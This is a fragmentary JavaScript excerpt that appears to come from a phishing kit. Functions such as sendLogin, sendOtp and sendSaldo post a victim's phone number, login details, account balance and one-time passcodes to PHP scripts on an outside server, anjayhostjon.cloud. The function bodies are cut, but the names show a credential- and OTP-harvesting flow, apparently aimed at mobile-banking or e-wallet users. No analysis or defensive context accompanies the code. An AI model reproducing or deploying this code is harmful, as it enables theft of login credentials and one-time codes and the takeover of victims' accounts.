function sendHp() {
   ...
   $.ajax({
      url: 'https://anjayhostjon.cloud/awx/akim/no.php',
      type: 'POST',
...
function sendLogin(){
   $('.load').fadeIn();
    ...
    $.ajax({
      url: 'https://anjayhostjon.cloud/awx/akim/sudah.php',
      type: 'POST',
...
function sendSaldoS() {
   ...
   $.ajax({
      url: 'https://anjayhostjon.cloud/awx/akim/saldosdh.php',
      type: 'POST',
...
function sendOtpS() {        
   ...
   $.ajax({
      url: 'https://anjayhostjon.cloud/awx/akim/otpsdh.php',
      type: 'POST',
...
document.getElementById("nohp").value =
    ...
    $.ajax({
      url: 'https://anjayhostjon.cloud/awx/akim/belum.php',
      type: 'POST',
...
function sendSaldo() {
   ...
   $.ajax({
      url: 'https://anjayhostjon.cloud/awx/akim/saldoblm.php',
      type: 'POST',
...
function sendOtp() {
   ...
   $.ajax({
      url: 'https://anjayhostjon.cloud/awx/akim/otpblm.php',
      type: 'POST',
